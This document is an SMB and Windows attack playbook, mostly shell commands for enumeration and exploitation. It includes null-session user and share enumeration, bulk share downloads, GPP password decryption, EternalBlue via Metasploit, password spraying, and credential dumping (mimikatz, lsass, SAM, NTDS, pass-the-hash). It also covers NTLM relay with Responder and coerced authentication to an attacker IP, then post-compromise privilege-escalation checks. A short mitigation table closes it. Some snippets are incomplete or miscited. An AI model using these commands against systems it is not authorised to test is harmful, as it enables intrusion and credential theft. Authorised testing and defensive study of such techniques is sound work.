# SMB & Windows Enumeration Playbook

> SMB (ports 139/445) is the most exploitable Windows service. This playbook covers: share enumeration, null sessions, user enumeration, relay attacks, and Windows-specific enumeration vectors.

---

## 1. Initial SMB Probing

```bash
# Check SMB version and signing
nmap -p 445 --script smb2-security-mode,smb-security-mode,smb2-capabilities <target>
nmap -p 445 --script smb-os-discovery <target>            # OS + domain info
crackmapexec smb <target>                                  # quick summary: OS, domain, signing

# Key info to collect:
# - SMB signing enabled/required (if NOT required → relay attack possible)
# - OS version → specific CVE lookup
# - Domain name → AD enumeration
# - Hostname → naming convention reveals environment
```

---

## 2. Null Session Enumeration

Null sessions allow unauthenticated queries to SMB for user/group/share info.

```bash
# enum4linux — classic, comprehensive
enum4linux -a <target>                   # all enumeration
enum4linux -u "" -p "" <target>         # explicit null session
enum4linux -U <target>                  # users only
enum4linux -S <target>                  # shares only
enum4linux -P <target>                  # password policy
enum4linux -G <target>                  # groups

# enum4linux-ng (Python rewrite, cleaner output)
enum4linux-ng -A <target>               # all
enum4linux-ng -A <target> -oY out.yml  # YAML output

# smbclient null session
smbclient -L //<target> -N              # list shares, no password
smbclient //<target>/share -N           # connect to share as null

# rpcclient null session
rpcclient -U "" -N <target>            # null session
rpcclient> enumdomusers                 # list domain users
rpcclient> enumdomgroups                # list groups
rpcclient> querydominfo                # domain info
rpcclient> getdompwinfo                # password policy
rpcclient> querygroupmem 0x200         # members of Domain Admins (RID 0x200=512)
rpcclient> queryuser 0x1f4             # query user by RID
```

---

## 3. Share Enumeration

```bash
# List all shares
smbclient -L //<target> -N                          # null session
smbclient -L //<target> -U "user%password"          # authenticated
crackmapexec smb <target> --shares                   # with null session
crackmapexec smb <target> -u "user" -p "pass" --shares  # authenticated

# Connect and browse
smbclient //<target>/SYSVOL -N                      # Group Policy (often readable)
smbclient //<target>/NETLOGON -N                    # logon scripts
smbclient //<target>/C$ -U "user%pass"              # admin share

# Mount shares (for easier browsing)
mount -t cifs //<target>/share /mnt/smb -o username=user,password=pass,domain=CORP

# Recursive download
smbclient //<target>/share -N -c 'recurse ON; prompt OFF; mget *'   # download all
smb: \> recurse
smb: \> ls                        # list recursive
smb: \> mget *                    # download everything

# smbmap — check permissions across all shares
smbmap -H <target>                                   # null session
smbmap -H <target> -u "user" -p "pass"              # authenticated
smbmap -H <target> -u "user" -p "pass" -R           # recursive listing
smbmap -H <target> -u "user" -p "pass" -r "C$"     # specific share, recursive
```

**Files to look for on shares:**
```
*.txt, *.conf, *.config, *.xml, *.ini    # credentials, configs
web.config, appsettings.json             # connection strings with passwords
GPO files in SYSVOL                      # Group Policy Preferences → creds
Netlogon scripts *.bat, *.cmd, *.vbs     # hardcoded credentials common
id_rsa, *.ppk, *.pem                     # SSH keys
ftp_creds.txt, passwords.xlsx            # obvious finds
KeePass .kdbx files                      # password database
```

---

## 4. Group Policy Preferences (GPP) — Credential Extraction

Old GPP stored AES-256 encrypted passwords with a public key. Decryptable.

```bash
# Find cpassword in SYSVOL
find /mnt/sysvol -name '*.xml' 2>/dev/null | xargs grep -l 'cpassword' 2>/dev/null

# Decrypt (key is published by Microsoft)
gpp-decrypt <cpassword_value>             # gpp-decrypt tool
python3 -c "
import base64
from Crypto.Cipher import AES
key = bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
ciphertext = base64.b64decode('<cpassword_base64>')
# AES-CBC decrypt
"

# Metasploit module
use post/windows/gather/credentials/gpp
```

**Finding:** GPP credentials found → CRITICAL. Often leads to domain admin via password reuse.

---

## 5. SMB Vulnerability Scanning

```bash
# EternalBlue (MS17-010) — Windows 7/Server 2008R2 → RCE as SYSTEM
nmap --script smb-vuln-ms17-010 -p 445 <target>
use exploit/windows/smb/ms17_010_eternalblue   # Metasploit

# EternalRomance (MS17-010 variant)
use exploit/windows/smb/ms17_010_psexec

# SMB signing check (prerequisite for relay attacks)
nmap --script smb2-security-mode -p 445 <target>
# If "Message signing enabled but not required" → relay attack possible

# Other SMB vulns
nmap --script smb-vuln-ms08-067 -p 445 <target>   # MS08-067 (Windows XP/2003)
nmap --script smb-vuln-ms10-054 -p 445 <target>   # DoS
nmap --script smb-vuln-ms10-061 -p 445 <target>   # print spooler
nmap --script smb-vuln-regsvc-dos -p 445 <target> # DoS
nmap -p 445 --script 'smb-vuln*' <target>         # all SMB vuln scripts

# PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
nmap --script smb-vuln-ms17-010 -p 445 <target>   # indirect indicator
impacket-rpcdump <target> | grep MS-RPRN          # Check if Print Spooler accessible
```

---

## 6. RPC Enumeration

```bash
# Enumerate all RPC endpoints
impacket-rpcdump @<target> | grep ncacn_tcp      # TCP-based RPC services
impacket-rpcdump @<target> | grep ncalrpc         # local RPC

# Key RPC interfaces to note:
# MS-RPRN (Print Spooler)  → PrintNightmare
# MS-EFSR (Encrypting File System) → PetitPotam
# MS-SAMR (SAM Remote Protocol) → user enumeration
# MS-DRSR (Directory Replication) → DCSync

rpcclient -U "" -N <target>
rpcclient> lsaquery              # domain SID
rpcclient> lookupnames administrator  # resolve name to SID
rpcclient> lookupsids S-1-5-21-...-500  # resolve SID to name
# RID cycling: enumerate all users by brute-forcing RIDs
for i in $(seq 500 1100); do
  rpcclient -U "" -N <target> -c "queryuser 0x$(printf '%x' $i)" 2>/dev/null | grep 'User Name'
done
```

---

## 7. CrackMapExec (CME) — Swiss Army Knife

```bash
# Host/domain discovery
crackmapexec smb 10.10.10.0/24            # sweep subnet

# Credential testing (password spraying)
crackmapexec smb <target> -u users.txt -p 'Password123!' --continue-on-success
crackmapexec smb <target> -u admin -p passwords.txt

# Check local admin access
crackmapexec smb <target> -u user -p pass          # (Pwn3d!) = local admin

# Command execution (requires local admin)
crackmapexec smb <target> -u admin -p pass -x "whoami /all"      # cmd.exe
crackmapexec smb <target> -u admin -p pass -X "Get-Process"      # PowerShell

# Modules
crackmapexec smb <target> -u admin -p pass -M mimikatz           # dump creds
crackmapexec smb <target> -u admin -p pass -M lsassy             # lsass dump
crackmapexec smb <target> -u admin -p pass -M gpp_password       # GPP creds
crackmapexec smb <target> -u admin -p pass -M petitpotam         # coerce auth
crackmapexec smb <target> -u admin -p pass --sam                 # SAM dump
crackmapexec smb <target> -u admin -p pass --lsa                 # LSA dump
crackmapexec smb <target> -u admin -p pass --ntds                # NTDS dump (DC)

# Pass the hash
crackmapexec smb <target> -u admin -H <NTLM_hash> -x "whoami"
```

---

## 8. NTLM Relay Attacks

**Prerequisite:** SMB signing not required on target + can capture or coerce NTLM auth.

```bash
# Step 1: Find hosts without SMB signing
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

# Step 2: Start relay (responder + ntlmrelayx)
# Disable SMB and HTTP in Responder.conf (we relay, not capture)
responder -I eth0 -rdw          # poison LLMNR/NBT-NS/mDNS
impacket-ntlmrelayx -tf relay_targets.txt -smb2support   # relay to targets

# Step 3: With relay → SAM dump, command exec, or shell
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "whoami > C:\\Temp\\out.txt"
impacket-ntlmrelayx -tf relay_targets.txt -smb2support --interactive  # interactive SMB shell

# Coerce authentication (PetitPotam / PrinterBug)
impacket-petitpotam <attacker_ip> <target_dc>     # coerce DC auth
python3 printerbug.py domain/user:pass@<target> <attacker_ip>   # PrinterBug
```

---

## 9. Windows-Specific Enumeration (Post-Compromise)

```bash
# System info
systeminfo
whoami /all                    # current user + privileges + groups
net user                       # local users
net localgroup administrators  # local admins
net group "Domain Admins" /domain  # domain admins
net accounts /domain           # password policy

# Network info
ipconfig /all                  # interfaces, DNS, gateway
route print                    # routing table
netstat -ano                   # connections + PIDs
net view /domain               # list domain computers

# Processes & services
tasklist /svc                  # processes + services
wmic service list brief        # services
sc query                       # service states
Get-Process | select Name,Id,Path  # PowerShell

# Installed software
wmic product get name,version  # installed software
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall /s  # 32-bit
reg query HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall /s  # 64-bit

# Scheduled tasks
schtasks /query /fo LIST /v    # all tasks verbose
Get-ScheduledTask | where {$_.TaskPath -notlike '*Microsoft*'}  # non-Microsoft tasks

# Registry autorun locations
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

# AlwaysInstallElevated check (if 1 in both keys → privesc via MSI)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Unquoted service paths (privesc)
wmic service get name,pathname | findstr /iv "C:\\Windows\\" | findstr /iv '"' | findstr ' '
```

---

## 10. Findings → Vulnerability Mapping

| Finding | Severity | CVE / CWE | Mitigation |
|---------|----------|-----------|------------|
| EternalBlue (MS17-010) | Critical | CVE-2017-0144 | Patch KB4012212; disable SMBv1 |
| SMB signing not required | High | — | Enforce SMB signing via GPO |
| Null session allowed | High | CWE-306 | Disable null session: RestrictAnonymous=2 |
| GPP credentials | Critical | MS14-025 | Remove GPP passwords; patch KB2962486 |
| PrintNightmare | Critical | CVE-2021-34527 | Disable Print Spooler on DCs; patch |
| Unquoted service paths | High | CWE-428 | Quote all service executable paths |
| AlwaysInstallElevated | High | — | Set both registry keys to 0 |
| Writable SYSTEM service path | High | — | Restrict write permissions on service directories |
| Exposed C$/ADMIN$ | Medium | — | Restrict admin shares to authorized admins |
